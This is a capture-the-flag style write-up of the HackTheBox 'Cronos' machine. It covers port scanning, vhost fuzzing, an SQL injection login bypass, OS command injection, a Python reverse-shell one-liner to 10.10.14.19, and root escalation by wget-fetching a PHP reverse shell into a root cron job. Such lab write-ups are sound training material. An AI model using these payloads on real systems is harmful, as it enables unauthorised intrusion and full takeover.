# Cronos

## Nmap

{% code overflow="wrap" %}
```bash
# Nmap 7.92 scan initiated Wed Oct  5 16:49:45 2022 as: nmap -Pn -p 22,53,80 -sCV -O -oN script-scan.txt -v cronos.htb
Nmap scan report for cronos.htb (10.10.10.13)
Host is up (0.026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Cronos
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.000 days (since Wed Oct  5 16:49:41 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  5 16:50:04 2022 -- 1 IP address (1 host up) scanned in 18.38 seconds
```
{% endcode %}

## HTTP

<figure><img src="../../../../.gitbook/assets/image (23) (2).png" alt=""><figcaption></figcaption></figure>

### Webfuzz

{% code overflow="wrap" %}
```
 kali@kali  ~/Documents/htb/cronos  gobuster vhost -u http://cronos.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -o webfuzz.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://cronos.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/10/07 16:35:44 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.cronos.htb (Status: 200) [Size: 1547]
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

### SQLi

{% embed url="https://book.hacktricks.xyz/pentesting-web/login-bypass#sql-injection-authentication-bypass" %}

We use the following payload for authentication bypass

```sql
admin' or '
```

<figure><img src="../../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

We will now test for OS Command Injection

```
8.8.8.8 & whoami
```

<figure><img src="../../../../.gitbook/assets/image (13) (3).png" alt=""><figcaption></figcaption></figure>

We can see we are the `www-data` user, so next we'll try to get a reverse shell

## Foothold

Set up your listener

```
rlwrap -cAr nc -lnvp 443
```

Enter this and click `execute`

{% code overflow="wrap" %}
```
8.8.8.8 & python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

Check your listener and you should have a shell

<figure><img src="../../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Checking for scheduled tasks, we see there's a file called `artisan` that is running as a cron job with root privileges every minute of every hour of every month of every day of the week. We'll replace the contents of the file with a php reverse shell.

<figure><img src="../../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>

I used revshells.com to generate a reverse shell and pasted it into a file called `privesc.php`

{% embed url="https://www.revshells.com/" %}

<figure><img src="../../../../.gitbook/assets/image (21) (2).png" alt=""><figcaption></figcaption></figure>

Using a python web server, I download the file onto the victim machine and changed the name to match the filename in the cron job

```
wget 10.10.14.19/privesc.php
```

<figure><img src="../../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>

Now set up a new listener (in my case, I will listen on port 445) and in just a few seconds, you should receive another shell, but this time as root

<figure><img src="../../../../.gitbook/assets/image (17) (3).png" alt=""><figcaption></figcaption></figure>
